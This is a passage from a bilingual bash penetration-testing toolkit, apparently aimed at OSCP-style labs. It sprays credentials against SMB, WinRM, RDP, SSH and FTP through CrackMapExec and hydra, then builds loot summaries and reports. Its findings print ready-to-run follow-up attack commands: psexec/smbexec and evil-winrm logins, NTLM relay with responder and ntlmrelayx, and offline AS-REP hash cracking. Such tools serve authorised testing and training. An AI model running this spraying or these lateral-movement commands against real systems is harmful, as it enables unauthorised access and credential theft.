            add_finding "💡 HACK: psexec.py ${spray_user}:'${spray_pass}'@${spray_target}"
            add_finding "💡 HACK: smbexec.py ${spray_user}:'${spray_pass}'@${spray_target}"
        elif grep -qF '[+]' "$smb_out" 2>/dev/null; then
            add_finding "${LGREEN}🔓 [SMB] ACCESO VÁLIDO:${NC} $spray_user:$spray_pass"
            add_finding "💡 HACK: smbclient //${spray_target}/C$ -U ${spray_user}%${spray_pass}"
        fi
    fi
    
    # WinRM (5985, 5986)
    if [[ " $protos " =~ " winrm " ]]; then
        any_tested=true
        log_run "Testeando WinRM en $spray_target..."
        local winrm_out="$LOOT_DIR/creds/spray_winrm.txt"
        $CME winrm "$spray_target" -u "$spray_user" -p "$spray_pass" --continue-on-success < /dev/null | tee "$winrm_out"
        if grep -qF 'Pwn3d!' "$winrm_out" 2>/dev/null; then
            add_finding "${LGREEN}💥 [WINRM] ADMIN PWNED:${NC} $spray_user:$spray_pass"
            add_finding "💡 HACK: evil-winrm -i ${spray_target} -u ${spray_user} -p '${spray_pass}'"
        elif grep -qF '[+]' "$winrm_out" 2>/dev/null; then
            add_finding "${LGREEN}🔓 [WINRM] ACCESO VÁLIDO:${NC} $spray_user:$spray_pass"
            add_finding "💡 HACK: evil-winrm -i ${spray_target} -u ${spray_user} -p '${spray_pass}'"
        fi
    fi
    
    # RDP (3389)
    if [[ " $protos " =~ " rdp " ]]; then
        any_tested=true
        log_run "Testeando RDP en $spray_target..."
        local rdp_out="$LOOT_DIR/creds/spray_rdp.txt"
        $CME rdp "$spray_target" -u "$spray_user" -p "$spray_pass" < /dev/null | tee "$rdp_out"
        if grep -qF '[+]' "$rdp_out" 2>/dev/null; then
            add_finding "${LGREEN}🔓 [RDP] ACCESO VÁLIDO:${NC} $spray_user:$spray_pass"
            add_finding "💡 HACK: xfreerdp /v:${spray_target} /u:${spray_user} /p:'${spray_pass}' /cert:ignore"
        fi
    fi
    
    # SSH (22)
    if [[ " $protos " =~ " ssh " ]]; then
        any_tested=true
        log_run "Testeando SSH en $spray_target..."
        local ssh_out="$LOOT_DIR/creds/spray_ssh.txt"
        $CME ssh "$spray_target" -u "$spray_user" -p "$spray_pass" --continue-on-success < /dev/null | tee "$ssh_out"
        if grep -qF '[+]' "$ssh_out" 2>/dev/null; then
            add_finding "${LGREEN}🔓 [SSH] ACCESO VÁLIDO:${NC} $spray_user:$spray_pass"
            add_finding "💡 HACK: sshpass -p '${spray_pass}' ssh -o StrictHostKeyChecking=no ${spray_user}@${spray_target}"
        fi
    fi
    
    # FTP (21)
    if [[ " $protos " =~ " ftp " ]]; then
        any_tested=true
        log_run "Testeando FTP en $spray_target..."
        local ftp_out="$LOOT_DIR/creds/spray_ftp.txt"
        local u_flag="-l"; [[ -f "$spray_user" ]] && u_flag="-L"
        local p_flag="-p"; [[ -f "$spray_pass" ]] && p_flag="-P"
        hydra $u_flag "$spray_user" $p_flag "$spray_pass" ftp://"$spray_target" -s 21 -I < /dev/null | tee "$ftp_out"
        if grep -qE "login:|\[21\]" "$ftp_out" 2>/dev/null; then
            add_finding "${LGREEN}🔓 [FTP] ACCESO VÁLIDO:${NC} $spray_user:$spray_pass"
            add_finding "💡 HACK: lftp -u ${spray_user},'${spray_pass}' ${spray_target}"
        fi
    fi
    
    if ! $any_tested; then
        log_warn "No se detectaron puertos de autenticación vulnerables (SMB/WinRM/RDP/SSH/FTP cerrados)."
    else
        echo ""
        log_ok "Validación terminada. Actualizando Dashboard..."
    fi
    
    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- UPGRADE 4: Loot Summary + Live Monitor ------------------------------------
# =============================================================================
show_summary() {
    require_loot || return
    banner
    log_section "LOOT SUMMARY & LIVE MONITOR"

    echo -e "  ${WHITE}[1]${NC} Visual Evidence Tree (Files & Sizes)     ${DIM}/ Árbol de archivos generados${NC}"
    echo -e "  ${LGREEN}${BOLD}[2]${NC}${LGREEN} Static loot summary (Parsed findings)   ${DIM}/ ⭐ RESUMEN COMPLETO — empieza aquí${NC}"
    echo -e "  ${WHITE}[3]${NC} Live monitor — tail active scan files     ${DIM}/ Monitor EN VIVO (Gobuster, Nikto...)${NC}"
    echo -e "  ${WHITE}[4]${NC} Monitor a specific file                   ${DIM}/ Vigilar un fichero concreto${NC}"
    echo -e "  ${WHITE}[5]${NC} List all tmux background windows          ${DIM}/ Ver tareas corriendo en fondo${NC}"
    echo -e "  ${WHITE}[6]${NC} Kill all background tmux windows          ${DIM}/ Matar todas las tareas en fondo${NC}"
    echo -e "  ${LRED}${BOLD}[7]${NC}${LRED} FULL REPORT → Export to file             ${DIM}/ 📋 ¡EXPORTAR REPORTE COMPLETO a fichero!${NC}"
    echo -e "  ${WHITE}[b]${NC} Back                                      ${DIM}/ Volver al menú principal${NC}"
    echo ""
    read -rp "  Option: " choice

    case $choice in
        1) _evidence_tree ;;
        2) _loot_static ;;
        3) _loot_live_all ;;
        4) _loot_live_file ;;
        5) _tmux_list_windows ;;
        6) _tmux_kill_all ;;
        7) export_full_report ;;
        b|B) return ;;
    esac

    echo ""; read -rp "  Press ENTER to continue..."
}

# Visual tree & Interactive Index
_evidence_tree() {
    echo ""
    log_section "EVIDENCE FOLDER TREE"
    if command -v tree &>/dev/null; then
        # -h human-readable, -C colorize, --dirsfirst
        tree -h -C --dirsfirst "$LOOT_DIR" | sed 's/^/  /'
    else
        echo -e "  ${CYAN}[*]${NC} 'tree' no instalado. Mostrando lista básica:\n"
        find "$LOOT_DIR" -type f -exec ls -lh {} + | awk '{print "  " $5 "\t" $9}'
    fi
    
    echo ""
    log_info "Generando Interactive Index para Obsidian/CherryTree..."
    local index_file="$LOOT_DIR/00_INDEX.md"
    echo "# 🗂️ Central Evidence Index — $IP" > "$index_file"
    echo "Auto-generated list of all findings. Open this vault in Obsidian or CherryTree for clickable links." >> "$index_file"
    echo "" >> "$index_file"
    
    find "$LOOT_DIR" -type f -name "*.txt" -o -name "*.md" | grep -v "00_INDEX.md" | grep -v "OSCP_Exam_Report" | sort | while read -r file; do
        local rel_path="${file#$LOOT_DIR/}"
        local filename=$(basename "$file")
        echo "- [[$rel_path]] — [$filename]($rel_path)" >> "$index_file"
    done
    
    log_ok "Interactive Index listo: ${WHITE}$index_file${NC}"
}

# Static loot summary
_loot_static() {
    echo ""
    # Refresh findings from disk files before displaying
    refresh_dashboard_data
    echo -e "  ${CYAN}Workspace: ${WHITE}$(pwd)/$LOOT_DIR${NC}"
    separator

    # Ports
    if [[ -n "$PORTS" ]]; then
        echo -e "\n  ${LGREEN}${BOLD}OPEN PORTS${NC}"
        echo "$PORTS" | tr ',' '\n' | while read -r p; do
            local _svc_name
            _svc_name=$(get_service_name "$p")
            echo -e "    ${GREEN}?${NC} $p/tcp  ${DIM}$_svc_name${NC}"
        done
    fi
    if [[ -n "$PORTS_UDP" ]]; then
        echo -e "\n  ${CYAN}${BOLD}UDP PORTS${NC}"
        echo "$PORTS_UDP" | tr ',' '\n' | while read -r p; do
            echo -e "    ${CYAN}?${NC} $p/udp"
        done
    fi

    # OS
    local os_color="$YELLOW"
    [[ "$OS_TARGET" == "Linux"   ]] && os_color="$LGREEN"
    [[ "$OS_TARGET" == "Windows" ]] && os_color="$LCYAN"
    echo -e "\n  ${os_color}${BOLD}OS DETECTION: $OS_ICON $OS_TARGET${NC}"

    # Vulns
    if [[ -f "$LOOT_DIR/scans/vulns.txt" ]]; then
        local vuln_count
        vuln_count=$(grep -c "VULNERABLE" "$LOOT_DIR/scans/vulns.txt" 2>/dev/null || echo 0)
        echo -e "\n  ${LRED}${BOLD}VULNERABILITIES: $vuln_count hits${NC}"
        grep -i "VULNERABLE\|CVE" "$LOOT_DIR/scans/vulns.txt" 2>/dev/null \
            | head -20 | sed 's/^/    /'
    fi

    # Web results -> supports both gobuster and feroxbuster
    local _web_found=false
    for _web_file in "$LOOT_DIR"/web/gobuster*.txt "$LOOT_DIR"/web/ferox*.txt; do
        [[ -f "$_web_file" ]] || continue
        local dir_count=0
        local _tool_label
        if echo "$_web_file" | grep -qi 'ferox'; then
            dir_count=$(grep -cP '^200\s' "$_web_file" 2>/dev/null || echo 0)
            _tool_label="FEROXBUSTER"
        else
            dir_count=$(grep -cP 'Status: (200|301|302|403)' "$_web_file" 2>/dev/null || echo 0)
            _tool_label="GOBUSTER"
        fi
        if [[ "$dir_count" -gt 0 ]]; then
            if ! $_web_found; then
                echo -e "\n  ${LPURPLE}${BOLD}WEB PATHS FOUND${NC}"
                _web_found=true
            fi
            echo -e "    ${DIM}[$_tool_label] $(basename "$_web_file") -> $dir_count hits${NC}"
            if echo "$_web_file" | grep -qi 'ferox'; then
                grep -P '^200\s' "$_web_file" 2>/dev/null \
                    | grep -oP 'https?://\S+' | head -15 | sed 's/^/      /'
            else
                grep -P 'Status: 200\b' "$_web_file" 2>/dev/null \
                    | head -15 | sed 's/^/      /'
            fi
        fi
    done

    # Credentials files
    local cred_files
    cred_files=$(find "$LOOT_DIR/creds/" -name "*.txt" -size +0c 2>/dev/null)
    if [[ -n "$cred_files" ]]; then
        echo -e "\n  ${YELLOW}${BOLD}CREDENTIAL FILES${NC}"
        while IFS= read -r f; do
            local lines; lines=$(wc -l < "$f")
            echo -e "    ${GREEN}→${NC} $f ${CYAN}($lines lines)${NC}"
        done <<< "$cred_files"
    fi

    # SMB Intelligence block -> hostname, domain, signing, shares
    local _has_smb=false
    [[ -f "$LOOT_DIR/smb/nxc_shares.txt" || -f "$LOOT_DIR/smb/smbmap.txt" || -f "$LOOT_DIR/smb/smbclient.txt" ]] && _has_smb=true
    if $_has_smb; then
        echo -e "\n  ${CYAN}${BOLD}SMB INTELLIGENCE${NC}"

        # Hostname + Domain + SMB version from $CME
        if [[ -f "$LOOT_DIR/smb/nxc_shares.txt" ]]; then
            local _h _d _s _os
            _h=$(grep -oP 'name:\K[^)]+' "$LOOT_DIR/smb/nxc_shares.txt" 2>/dev/null | head -1 | tr -d ' ')
            _d=$(grep -oP 'domain:\K[^)]+' "$LOOT_DIR/smb/nxc_shares.txt" 2>/dev/null | head -1 | tr -d ' ')
            _s=$(grep -oP 'signing:\K[^)]+' "$LOOT_DIR/smb/nxc_shares.txt" 2>/dev/null | head -1 | tr -d ' ')
            _os=$(grep -oP 'Windows[^(]+' "$LOOT_DIR/smb/nxc_shares.txt" 2>/dev/null | head -1 | sed 's/[[:space:]]*$//')
            [[ -n "$_h"  ]] && echo -e "    ${WHITE}Hostname :${NC} $_h"
            [[ -n "$_d"  ]] && echo -e "    ${WHITE}Domain   :${NC} $_d"
            [[ -n "$_os" ]] && echo -e "    ${WHITE}OS       :${NC} $_os"
            if [[ "$_s" == "False" ]]; then
                echo -e "    ${LRED}${BOLD}Signing  : DISABLED -> NTLM RELAY POSIBLE${NC}"
                echo -e "    ${YELLOW}   -> responder -I tun0 -wdv${NC}"
                echo -e "    ${YELLOW}   -> ntlmrelayx.py -tf targets.txt -smb2support${NC}"
            else
                echo -e "    ${GREEN}Signing  : Enabled${NC}"
            fi
        fi

        # Guest session info from enum4linux
        if [[ -f "$LOOT_DIR/smb/enum4linux.yaml" ]]; then
            local _guest_ok
            _guest_ok=$(grep -A1 'guest:' "$LOOT_DIR/smb/enum4linux.yaml" 2>/dev/null | grep 'true')
            [[ -n "$_guest_ok" ]] && echo -e "    ${YELLOW}${BOLD}Guest session: ACTIVA -> enumerar con -U guest%${NC}"
        fi
        echo ""

        # Readable shares (prefer smbmap, fallback to smbclient)
        local _smb_display_file="$LOOT_DIR/smb/smbmap.txt"
        if [[ -f "$_smb_display_file" ]] && grep -qiE 'READ ONLY|READ, WRITE|NO ACCESS' "$_smb_display_file" 2>/dev/null; then
            echo -e "    ${WHITE}Shares accesibles (smbmap):${NC}"
            grep -iE 'READ ONLY|READ, WRITE|NO ACCESS' "$_smb_display_file" 2>/dev/null \
                | grep -v '^\s*$' | head -15 | while read -r line; do
                local _color="$GRAY"
                echo "$line" | grep -qi 'NO ACCESS' && _color="$GRAY"
                echo "$line" | grep -qi 'READ' && _color="$YELLOW"
                echo "$line" | grep -qi 'WRITE' && _color="$LRED"
                echo -e "    ${_color}$line${NC}"
            done
        elif [[ -f "$LOOT_DIR/smb/smbclient.txt" ]]; then
            # Fallback: parse smbclient -L output for share names
            local _smbclient_shares
            _smbclient_shares=$(grep -E '^\s+\S+\s+(Disk|IPC)' "$LOOT_DIR/smb/smbclient.txt" 2>/dev/null | awk '{print $1}')
            if [[ -n "$_smbclient_shares" ]]; then
                echo -e "    ${WHITE}Shares detectadas (smbclient):${NC}"
                while IFS= read -r _sh; do
                    if [[ "$_sh" == "IPC\$" ]]; then
                        echo -e "    ${GRAY}  \\\\\\\\$IP\\\\$_sh  (IPC - no exploitable)${NC}"
                    else
                        echo -e "    ${YELLOW}${BOLD}  \\\\\\\\$IP\\\\$_sh${NC}"
                        echo -e "    ${DIM}    -> smbclient //$IP/$_sh -N${NC}"
                        echo -e "    ${DIM}    -> smbclient //$IP/$_sh -U 'guest%'${NC}"
                    fi
                done <<< "$_smbclient_shares"
            fi
        fi

        # Files found in recursive crawl
        if [[ -f "$LOOT_DIR/smb/smbmap_recursive.txt" ]]; then
            local _rfile_count
            _rfile_count=$(grep -cP '\.\w{2,5}' "$LOOT_DIR/smb/smbmap_recursive.txt" 2>/dev/null || echo 0)
            if (( _rfile_count > 0 )); then
                echo -e "\n    ${LGREEN}${BOLD}Archivos en shares ($_rfile_count lineas):${NC}"
                grep -P '\.\w{2,5}' "$LOOT_DIR/smb/smbmap_recursive.txt" 2>/dev/null | head -20 | sed 's/^/    /'
                local _sensitive_smb
                _sensitive_smb=$(grep -iP '\.(ps1|bat|cmd|vbs|txt|xml|conf|config|ini|bak|old|zip|sql|key|pem|pfx|crt|credentials?|password|secret)' \
                    "$LOOT_DIR/smb/smbmap_recursive.txt" 2>/dev/null | head -10)
                if [[ -n "$_sensitive_smb" ]]; then
                    echo -e "    ${LRED}${BOLD}Archivos sensibles:${NC}"
                    echo "$_sensitive_smb" | sed 's/^/      /'
                fi
            fi
        fi
    fi

    # LDAP / Active Directory section
    local _has_ldap=false
    for _lf in "$LOOT_DIR/ldap/ldap_users.txt" "$LOOT_DIR/ldap/ldap.txt" "$LOOT_DIR/smb/enum4linux.yaml"; do
        [[ -f "$_lf" ]] && _has_ldap=true && break
    done
    if $_has_ldap; then
        echo -e "\n  ${LBLUE}${BOLD}ACTIVE DIRECTORY / LDAP${NC}"
        # Users from ldap
        if [[ -f "$LOOT_DIR/ldap/ldap_users.txt" ]] && [[ -s "$LOOT_DIR/ldap/ldap_users.txt" ]]; then
            local _user_count
            _user_count=$(wc -l < "$LOOT_DIR/ldap/ldap_users.txt")
            echo -e "    ${WHITE}Usuarios AD ($_user_count):${NC}"
            head -20 "$LOOT_DIR/ldap/ldap_users.txt" | sed 's/^/      /'
        fi
        # Groups from enum4linux
        if [[ -f "$LOOT_DIR/smb/enum4linux.yaml" ]]; then
            local _groups
            _groups=$(grep -A1 'groups:' "$LOOT_DIR/smb/enum4linux.yaml" 2>/dev/null | head -10)
            [[ -n "$_groups" ]] && echo -e "    ${WHITE}Grupos:${NC}" && echo "$_groups" | sed 's/^/      /'
        fi
        # Roastable accounts
        if [[ -f "$LOOT_DIR/ldap/asrep_hashes.txt" ]] && [[ -s "$LOOT_DIR/ldap/asrep_hashes.txt" ]]; then
            local _hash_count
            _hash_count=$(grep -c 'krb5asrep' "$LOOT_DIR/ldap/asrep_hashes.txt" 2>/dev/null || echo 0)
            echo -e "    ${LRED}${BOLD}AS-REP Roastable hashes: $_hash_count -> CRACKEAR OFFLINE${NC}"
            echo -e "    ${YELLOW}   -> hashcat -m 18200 asrep_hashes.txt rockyou.txt${NC}"
        fi
    fi

    # All generated files
    echo -e "\n  ${GRAY}${BOLD}ALL OUTPUT FILES${NC}"
    find "$LOOT_DIR" \( -name "*.txt" -o -name "*.nmap" -o -name "*.xml" -o -name "*.yaml" \) \
        2>/dev/null | sort | while IFS= read -r f; do
        local sz; sz=$(du -sh "$f" 2>/dev/null | cut -f1)
        echo -e "    ${GRAY}$f${NC} ${DIM}[$sz]${NC}"
    done
    echo ""

    # FINDINGS -> deduplicated y categorizados
    if [[ ${#FINDINGS[@]} -gt 0 ]]; then
        # Deduplicate: strip ANSI codes for comparison, keep first occurrence
        local -A _seen_findings=()
        local -a _dedup_findings=()
        for f in "${FINDINGS[@]}"; do
            local _plain
            # Use printf to correctly interpret escape sequences before stripping
            _plain=$(printf '%b' "$f" | sed $'s/\033\\[[0-9;]*[a-zA-Z]//g' | tr -s ' ' | sed 's/^[[:space:]]*//')
            if [[ -z "${_seen_findings[$_plain]:-}" ]]; then
                _seen_findings["$_plain"]=1
                _dedup_findings+=("$f")
            fi
        done
        local _total_dedup=${#_dedup_findings[@]}
        echo -e "\n  ${LRED}${BOLD}--- PARSED FINDINGS ($_total_dedup ?nicos de ${#FINDINGS[@]} total) ---${NC}"
        # Print in categories
        local _cats=(
            '📋 HACK'          "${YELLOW}  📋 ACCIONES MANUALES:${NC}"
            'CREDENCIAL|🔑'    "${LGREEN}  🔑 CREDENCIALES:${NC}"
            '🔴|SENSITIVE'     "${LRED}  🔴 ARCHIVOS SENSIBLES:${NC}"
            'CVE-|VULNERABLE|🚨' "${LRED}  🚨 VULNERABILIDADES:${NC}"
            'NIKTO|NUCLEI'     "${YELLOW}  🌐  WEB FINDINGS:${NC}"
            '200 OK|301 DIR|GOBUSTER|FEROX' "${LPURPLE}  🌐 WEB PATHS:${NC}"
            'SMB|SHARE|GUEST'  "${CYAN}  📋 SMB:${NC}"
            'HOSTNAME|DOMAIN|SIGNING' "${CYAN}  🖥  AD/HOST INFO:${NC}"
            'AS-REP|KERBEROAST' "${LRED}  🔑 KERBEROS:${NC}"
        )
        local _i=0
        while [[ $_i -lt ${#_cats[@]} ]]; do
            local _rx="${_cats[$_i]}"
            local _header="${_cats[$((_i+1))]}"
            local _printed_header=false
            for f in "${_dedup_findings[@]}"; do
                if echo "$f" | grep -qiE "$_rx"; then
                    if ! $_printed_header; then
                        echo -e "$_header"
                        _printed_header=true
                    fi
                    echo -e "      -> $f"
                fi
            done
            ((_i+=2))
        done
        # Catch-all: anything not matching above categories
        local _all_rx='🌐 HACK|CREDENCIAL|🔑|🔴|SENSITIVE|CVE-|VULNERABLE|🔑|NIKTO|NUCLEI|200 OK|301 DIR|GOBUSTER|FEROX|SMB|SHARE|GUEST|HOSTNAME|DOMAIN|SIGNING|AS-REP|KERBEROAST'
        local _misc_printed=false
        for f in "${_dedup_findings[@]}"; do
            if ! echo "$f" | grep -qiE "$_all_rx"; then
                if ! $_misc_printed; then
                    echo -e "  ${GRAY}  📝 OTROS:${NC}"
                    _misc_printed=true
                fi
                echo -e "      -> $f"
            fi
        done
    else
        echo -e "\n  ${DIM}No findings yet → run [A] Auto-Recon to populate.${NC}"
    fi
}

# Live monitor — tail all active/recent scan files simultaneously
_loot_live_all() {
    echo ""
    log_section "LIVE MONITOR — Real-time scan output"
    log_info "Detecting active output files in ${WHITE}$LOOT_DIR${NC}..."
    echo ""

    # Find files modified in the last 10 minutes (likely still writing or just finished)
    local active_files=()
    while IFS= read -r f; do
        active_files+=("$f")
    done < <(find "$LOOT_DIR" -name "*.txt" -mmin -10 2>/dev/null | sort)

    if [[ ${#active_files[@]} -eq 0 ]]; then
        log_warn "No recently-modified files found. Nothing seems to be running."
        log_info "If background tasks are active, check tmux: ${WHITE}tmux attach -t $TMUX_SESSION${NC}"
        return
    fi

    echo -e "  ${LGREEN}Monitoring ${#active_files[@]} active file(s):${NC}"
    for f in "${active_files[@]}"; do
        echo -e "    ${CYAN}→${NC} $f"
    done
    echo ""
    echo -e "  ${YELLOW}[!] Press Ctrl+C to stop monitoring and return to menu.${NC}"
    echo ""
    sleep 1

    # Build tail arguments: -f file1 -f file2 ...
    local tail_args=()
    for f in "${active_files[@]}"; do
        tail_args+=("-f" "$f")
    done

    # trap Ctrl+C to cleanly return
    trap 'echo -e "\n  ${YELLOW}[!] Live monitor stopped.${NC}"; trap - INT; return' INT
    tail "${tail_args[@]}" --verbose 2>/dev/null
    trap - INT
}

# Monitor a single specific file
_loot_live_file() {
    echo ""
    log_info "Available output files:"
    local i=1
    local file_list=()
    while IFS= read -r f; do
        echo -e "  ${WHITE}[$i]${NC} $f"
        file_list+=("$f")
        ((i++))
    done < <(find "$LOOT_DIR" -name "*.txt" -o -name "*.nmap" 2>/dev/null | sort)

    echo ""
    read -rp "  Select file number (or enter path directly): " sel

    local target_file=""
    if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#file_list[@]} )); then
        target_file="${file_list[$((sel-1))]}"
    elif [[ -f "$sel" ]]; then
        target_file="$sel"
    else
        log_error "Invalid selection."
        return
    fi

    echo ""
    echo -e "  ${YELLOW}[!] Press Ctrl+C to stop.${NC}"
    echo ""
    trap 'echo -e "\n  ${YELLOW}[!] Stopped.${NC}"; trap - INT; return' INT
    tail -f "$target_file" 2>/dev/null
    trap - INT
}

# List all tmux background windows
_tmux_list_windows() {
    echo ""
    if ! tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        log_warn "Tmux session '$TMUX_SESSION' is not running. No background tasks active."
        return
    fi

    log_ok "Active tmux windows in session ${WHITE}$TMUX_SESSION${NC}:"
    echo ""
    tmux list-windows -t "$TMUX_SESSION" -F \
        "    #{window_index}: #{window_name}  [#{window_active}]  #{?pane_dead,DONE,RUNNING}" \
        2>/dev/null
    echo ""

    if [[ -n "$TMUX" ]]; then
        log_info "Switch to a window: ${WHITE}Ctrl-b <number>${NC}"
    else
        log_info "Attach with: ${WHITE}tmux attach -t $TMUX_SESSION${NC}"
    fi
}

# Kill all background tmux windows (keep the session)
_tmux_kill_all() {
    if ! tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        log_warn "No tmux session running."
        return
    fi

    read -rp "  $(echo -e "${LRED}Kill ALL background tmux windows? [y/N]:${NC} ")" confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        tmux kill-session -t "$TMUX_SESSION" 2>/dev/null
        log_ok "Tmux session '$TMUX_SESSION' killed. All background tasks stopped."
    else
        log_info "Cancelled."
    fi
}

# =============================================================================
# -- 11. Check tools -----------------------------------------------------------
# =============================================================================
check_tools() {
    banner
    log_section "TOOL CHECK"

    local tools=(
        nmap rustscan gobuster feroxbuster nikto whatweb ffuf nuclei
        enum4linux-ng smbmap smbclient $CME
        impacket-GetNPUsers impacket-GetUserSPNs impacket-mssqlclient
        bloodhound-python kerbrute wpscan droopescan hydra searchsploit
        ldapsearch onesixtyone snmpwalk snmp-check showmount
        curl tmux ssh-audit
    )

    for t in "${tools[@]}"; do
        check_tool "$t"
    done



    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- FULL CONSOLIDATED REPORT EXPORT ------------------------------------------
# =============================================================================
export_full_report() {
    require_ip || return
    require_loot || return

    local report="$LOOT_DIR/FULL_REPORT_${IP//./_}.txt"
    local C_TITLE="\e[1;96m"   # Bold Cyan
    local C_SEC="\e[1;93m"     # Bold Yellow
    local C_OK="\e[1;92m"      # Bold Green
    local C_WARN="\e[1;91m"    # Bold Red
    local C_INFO="\e[0;36m"    # Cyan
    local C_VAL="\e[1;97m"     # Bold White
    local C_DIM="\e[2m"        # Dim
    local C_R="\e[0m"          # Reset
    local SEP="-------------------------------------------------------------------"

    log_run "Generating full report / Generando reporte completo: $report..."

    {
        echo -e "${C_TITLE}${SEP}"
        echo -e "   📋  FULL INTELLIGENCE REPORT / REPORTE COMPLETO DE INTELIGENCIA"
        echo -e "   Target: $IP"
        echo -e "   Generated/Generado: $(date)"
        echo -e "   Workspace: $(pwd)/$LOOT_DIR"
        echo -e "${SEP}${C_R}"
        echo ""

        # -- 1. TARGET OVERVIEW --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  1. 🎯 TARGET OVERVIEW / RESUMEN DEL OBJETIVO               ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        echo -e "  IP:           ${C_VAL}$IP${C_R}"
        echo -e "  OS Detected:  ${C_VAL}${OS_ICON:-?} ${OS_TARGET:-Unknown}${C_R}"
        echo -e "  Domain:       ${C_VAL}${DOMAIN:-N/A}${C_R}"
        echo -e "  CMS:          ${C_VAL}${CMS_DETECTED:-Not Detected}${C_R}"
        if [[ ${#DOMAINS_FOUND[@]} -gt 0 ]]; then
            echo -e "  Domains Found:"
            for d in "${DOMAINS_FOUND[@]}"; do
                echo -e "    ${C_OK}→${C_R} $d"
            done
        fi
        echo ""

        # -- 2. OPEN PORTS --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  2. 🔌 OPEN PORTS / PUERTOS ABIERTOS                        ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        if [[ -n "$PORTS" ]]; then
            echo -e "  ${C_OK}TCP:${C_R}"
            echo "$PORTS" | tr ',' '\n' | while read -r p; do
                echo -e "    ${C_OK}→${C_R} $p/tcp"
            done
        else
            echo -e "  ${C_DIM}No TCP ports scanned yet${C_R}"
        fi
        if [[ -n "$PORTS_UDP" ]]; then
            echo -e "  ${C_INFO}UDP:${C_R}"
            echo "$PORTS_UDP" | tr ',' '\n' | while read -r p; do
                echo -e "    ${C_INFO}→${C_R} $p/udp"
            done
        fi
        echo ""

        # -- 3. SERVICE VERSIONS --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  3. 🔍 SERVICE VERSIONS / VERSIONES DE SERVICIOS             ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        if [[ ${#SERVICES_VERSION[@]} -gt 0 ]]; then
            printf "  ${C_VAL}%-8s %-15s %s${C_R}\n" "PORT" "SERVICE" "VERSION"
            printf "  ${C_DIM}%-8s %-15s %s${C_R}\n" "--------" "---------------" "-------------------------"
            for svc in "${SERVICES_VERSION[@]}"; do
                local sp sv svr
                sp=$(echo "$svc" | cut -d: -f1)
                sv=$(echo "$svc" | cut -d: -f2)
                svr=$(echo "$svc" | cut -d: -f3-)
                printf "  %-8s %-15s ${C_INFO}%s${C_R}\n" "$sp" "$sv" "$svr"
            done
        else
            echo -e "  ${C_DIM}Run Deep Scan [3] to detect service versions${C_R}"
        fi
        echo ""

        # -- 4. VULNERABILITIES & CVEs --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  4. 🚨 VULNERABILITIES & CVEs                                ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        if [[ -f "$LOOT_DIR/scans/vulns.txt" ]]; then
            local vuln_hits
            vuln_hits=$(grep -ci "VULNERABLE" "$LOOT_DIR/scans/vulns.txt" 2>/dev/null || echo 0)
            echo -e "  ${C_WARN}VULNERABLE entries: $vuln_hits${C_R}"
            grep -i "VULNERABLE" "$LOOT_DIR/scans/vulns.txt" 2>/dev/null | sed 's/^/    /' | head -30
            echo ""
            local cves
            cves=$(grep -oP 'CVE-\d{4}-\d+' "$LOOT_DIR/scans/vulns.txt" 2>/dev/null | sort -u)
            if [[ -n "$cves" ]]; then
                echo -e "  ${C_WARN}CVEs detected:${C_R}"
                echo "$cves" | while read -r c; do
                    echo -e "    ${C_WARN}⚠${C_R}  $c"
                done
            fi
        else
            echo -e "  ${C_DIM}No vuln scan results found${C_R}"
        fi
        echo ""

        # -- 5. WEB DIRECTORIES --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  5. 🌐 WEB DIRECTORIES / DIRECTORIOS WEB                     ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        for gf in "$LOOT_DIR"/web/gobuster*.txt; do
            [[ -f "$gf" ]] || continue
            local gf_name="$(basename "$gf")"
            local dir_count
            dir_count=$(grep -cP 'Status: (200|301|302|403)' "$gf" 2>/dev/null || echo 0)
            echo -e "  ${C_INFO}-- $gf_name ($dir_count paths) --${C_R}"
            echo ""
            echo -e "  ${C_OK}Status 200 (Accessible):${C_R}"
            grep -P 'Status: 200\b' "$gf" 2>/dev/null | head -20 | sed 's/^/    /' 
            echo ""
            echo -e "  ${C_INFO}Status 301/302 (Redirect):${C_R}"
            grep -P 'Status: (301|302)' "$gf" 2>/dev/null | head -15 | sed 's/^/    /'
            echo ""
            echo -e "  ${C_WARN}Status 403 (Forbidden — exists but restricted):${C_R}"
            grep -P 'Status: 403' "$gf" 2>/dev/null | head -10 | sed 's/^/    /'
            echo ""
        done
        if [[ ! -f "$LOOT_DIR/web/gobuster.txt" ]] && ! ls "$LOOT_DIR"/web/gobuster*.txt &>/dev/null; then
            echo -e "  ${C_DIM}No gobuster results found${C_R}"
        fi
        echo ""

        # -- 6. EXPLOIT SEARCH RESULTS --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  6. 💣 EXPLOIT SEARCH / BÚSQUEDA DE EXPLOITS                 ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        for ef in "$LOOT_DIR"/exploit/searchsploit*.txt; do
            [[ -f "$ef" ]] || continue
            local ef_name="$(basename "$ef")"
            echo -e "  ${C_WARN}-- $ef_name --${C_R}"
            cat "$ef" | head -50 | sed 's/^/    /'
            echo ""
        done
        if ! ls "$LOOT_DIR"/exploit/searchsploit*.txt &>/dev/null; then
            echo -e "  ${C_DIM}No searchsploit results. Run Auto-Recon [A] or Exploit Search [E].${C_R}"
        fi
        echo ""

        # -- 7. SMB SHARES --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  7. 📁 SMB SHARES / CARPETAS COMPARTIDAS                     ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        if [[ -f "$LOOT_DIR/smb/smbmap.txt" ]]; then
            cat "$LOOT_DIR/smb/smbmap.txt" | head -30 | sed 's/^/    /'
        fi
